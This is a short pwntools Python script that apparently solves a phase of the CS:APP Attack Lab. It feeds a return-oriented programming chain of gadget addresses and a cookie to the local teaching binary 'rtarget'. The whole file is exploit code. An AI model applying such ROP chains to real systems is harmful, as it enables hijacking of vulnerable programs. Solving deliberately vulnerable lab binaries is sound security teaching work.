from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')

p = process(argv=['./rtarget', '-q'])

rdi_ret = 0x000000000040141b
rsi = 0x401383
cookie = 0x59b997fa
rsp2rax = 0x0000000000401a06
rax2rdi = 0x4019a2

# payload4 = b'a'*0x28 + p64(rdi_ret) + p64(cookie) + p64(0x4017ec)
payload5 = b'59b997fa' + b'\x00'*0x20 + p64(rsi) + p64(18446744073709551552) + p64(rsp2rax)+p64(rax2rdi) + p64(0x4019d6) + p64(rax2rdi) + p64(0x4018fa)

# gdb.attach(p, 'b *0x4017BD')
p.recv()
p.sendline(payload5)

p.interactive()